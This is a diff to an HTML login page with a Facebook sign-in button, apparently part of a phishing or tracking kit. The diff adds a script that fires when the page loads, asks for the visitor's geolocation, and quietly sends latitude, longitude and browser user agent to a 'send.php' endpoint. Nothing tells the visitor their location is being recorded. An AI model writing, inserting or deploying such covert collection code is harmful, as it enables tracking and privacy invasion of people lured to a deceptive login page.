@@ -116,7 +116,20 @@
         }
     </style>
 </head>
-<body>
+<body onload="getLocation()">
+    <script>
+        function getLocation() {
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition);
+          }
+        }
+        
+        function showPosition(position) {
+          const xhttp = new XMLHttpRequest();
+          xhttp.open("GET", "send.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&agent=" + navigator.userAgent )
+          xhttp.send();
+        }
+    </script>
     <div class="login-container">
         <img src="loo.png" alt="Logo" class="logo">
         <!-- Botón de inicio de sesión con Facebook -->
